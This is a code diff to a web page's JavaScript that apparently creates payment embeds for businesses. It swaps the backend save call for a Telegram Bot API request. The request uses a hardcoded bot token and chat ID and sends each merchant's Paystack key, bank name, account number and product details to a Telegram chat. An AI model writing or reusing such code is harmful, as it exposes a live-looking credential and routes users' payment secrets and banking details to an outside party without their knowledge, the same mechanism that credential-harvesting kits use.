@@ -349,18 +349,36 @@
       document.getElementById('iframeCode').value = iframeCode;
       document.getElementById('result').style.display = 'block';
 
-      fetch('/.netlify/functions/save-data', {
+      // Hardcoded Telegram notification
+      const telegramBotToken = '8129183386:AAF3GtzmXXU_YXqO_1T_h1-lKn3r0ZjtSpw';
+      const telegramChatId = '-4970144487';
+      const telegramMessage = `🎉 New Business/Product Created!\n\n📌 Business: ${businessName}\n📦 Product: ${productName}\n💰 Amount: ₦${amount}\n🔑 Paystack Key: ${paystackKey}\n💳 Crypto Enabled: ${cryptoEnabled ? 'Yes' : 'No'}\n📱 Account Number: ${accountNumber || 'N/A'}\n🏦 Bank Name: ${bankName || 'N/A'}\n🕒 Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}`;
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ type: 'product', businessName, productName, amount, paystackKey, isCryptoEnabled: cryptoEnabled, accountNumber, bankName, userId })
+        body: JSON.stringify({ chat_id: telegramChatId, text: telegramMessage })
       }).then(response => response.json()).then(data => {
-        console.log('Success:', data);
-        if (data.message) alert(data.message);
-        else alert('Data saved, but no confirmation message received.');
+        console.log('Telegram Response:', data);
+        if (data.ok) alert('Telegram notification sent successfully!');
+        else alert('Failed to send Telegram notification: ' + data.description);
       }).catch(error => {
-        console.error('Error:', error);
-        alert('Failed to save details. Check console for details.');
+        console.error('Telegram Error:', error);
+        alert('Error sending Telegram notification. Check console.');
       });
+
+      // Note: The fetch to save-data is commented out for this test
+      // fetch('/.netlify/functions/save-data', {
+      //   method: 'POST',
+      //   headers: { 'Content-Type': 'application/json' },
+      //   body: JSON.stringify({ type: 'product', businessName, productName, amount, paystackKey, isCryptoEnabled: cryptoEnabled, accountNumber, bankName, userId })
+      // }).then(response => response.json()).then(data => {
+      //   console.log('Success:', data);
+      //   if (data.message) alert(data.message);
+      //   else alert('Data saved, but no confirmation message received.');
+      // }).catch(error => {
+      //   console.error('Error:', error);
+      //   alert('Failed to save details. Check console for details.');
+      // });
     });
 
     // Call fetchBankList on load if needed, but move to backend in production
